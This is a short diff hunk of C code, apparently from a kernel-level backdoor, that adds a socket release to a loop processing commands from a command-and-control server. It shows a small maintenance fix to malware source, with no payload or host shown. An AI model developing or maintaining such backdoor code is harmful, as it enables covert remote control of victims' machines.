@@ -152,6 +152,9 @@ int backdoor_run(void *data)
     // Process command from C2
     handle_cmd(buffer, size);
 
+    // Release connection
+    sock_release(bkdoor->conn);
+
     schedule();
   }
 
